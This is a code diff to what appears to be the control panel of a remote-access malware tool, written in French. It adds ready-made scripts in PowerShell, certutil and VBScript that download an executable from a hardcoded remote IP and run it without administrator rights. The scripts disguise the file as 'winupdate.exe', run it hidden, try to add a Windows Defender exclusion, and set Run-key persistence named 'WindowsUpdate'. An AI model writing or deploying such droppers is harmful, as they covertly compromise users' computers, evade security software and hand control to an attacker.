@@ -7,6 +7,91 @@ const AGENT_URL_API = "http://141.11.185.92:8801/uploads/executable/helper.exe";
 
 const scripts = [
     {
+        category: "🔑 Sans droits Administrateur (Compte utilisateur simple)",
+        color: "#ef4444",
+        bgColor: "rgba(239,68,68,0.1)",
+        borderColor: "rgba(239,68,68,0.25)",
+        items: [
+            {
+                id: "no-admin-usertemp",
+                title: "Installation dans AppData (Sans Admin)",
+                description: "Télécharge et exécute depuis AppData\\Roaming — aucun droit admin requis, fonctionne avec n'importe quel compte.",
+                icon: "👤",
+                lang: "powershell",
+                code: `# Fonctionne SANS droits administrateur
+$dest = "$env:APPDATA\\winupdate.exe"
+(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)
+Start-Process $dest`,
+            },
+            {
+                id: "no-admin-cmd",
+                title: "CMD sans Admin (certutil + AppData)",
+                description: "Version CMD pure, pas de PowerShell. Fonctionne depuis Exécuter (Win+R) ou CMD classique.",
+                icon: "📋",
+                lang: "cmd",
+                code: `certutil -urlcache -split -f "${AGENT_URL}" "%APPDATA%\\winupdate.exe"
+start "" "%APPDATA%\\winupdate.exe"`,
+            },
+            {
+                id: "no-admin-exclusion",
+                title: "Exclusion Defender sans Admin (User Policy)",
+                description: "Ajoute une exclusion Defender via la politique utilisateur (ne nécessite pas d'UAC/admin sur certaines configs).",
+                icon: "🛡️",
+                lang: "powershell",
+                code: `# Exclusion sans UAC sur certaines configurations Windows 10/11
+$dest = "$env:LOCALAPPDATA\\Microsoft\\Windows\\winupdate.exe"
+
+# Tenter une exclusion sans admin
+try {
+    Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -ErrorAction Stop
+    Write-Host "Exclusion ajoutée avec succès."
+} catch {
+    Write-Host "Exclusion non possible sans admin, on essaie quand même..."
+}
+
+(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)
+Start-Process $dest -WindowStyle Hidden`,
+            },
+            {
+                id: "no-admin-wscript",
+                title: "Bypass via WScript (VBScript)",
+                description: "Utilise WScript pour télécharger et lancer silencieusement. Aucun admin requis.",
+                icon: "📜",
+                lang: "vbscript",
+                code: `' Créer ce fichier en .vbs et double-cliquer dessus
+Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
+objHTTP.Open "GET", "${AGENT_URL}", False
+objHTTP.Send
+
+Dim oStream
+Set oStream = CreateObject("ADODB.Stream")
+oStream.Type = 1
+oStream.Open
+oStream.Write objHTTP.ResponseBody
+oStream.SaveToFile Environ("APPDATA") & "\\winupdate.exe", 2
+oStream.Close
+
+CreateObject("WScript.Shell").Run Environ("APPDATA") & "\\winupdate.exe", 0, False`,
+            },
+            {
+                id: "no-admin-startup",
+                title: "Persistance sans Admin (Startup Utilisateur)",
+                description: "Ajoute l'agent au démarrage via le Registre utilisateur (HKCU) — aucun admin requis.",
+                icon: "🔄",
+                lang: "powershell",
+                code: `# Sans droits admin : utilise HKCU (courant utilisateur)
+$dest = "$env:APPDATA\\Microsoft\\winupdate.exe"
+(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)
+
+# Persistance dans le registre utilisateur (pas besoin d'admin)
+Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value $dest
+
+Start-Process $dest -WindowStyle Hidden
+Write-Host "Agent installé avec persistance (sans admin)."`,
+            },
+        ],
+    },
+    {
         category: "Installation Directe",
         color: "#3b82f6",
         bgColor: "rgba(59,130,246,0.1)",
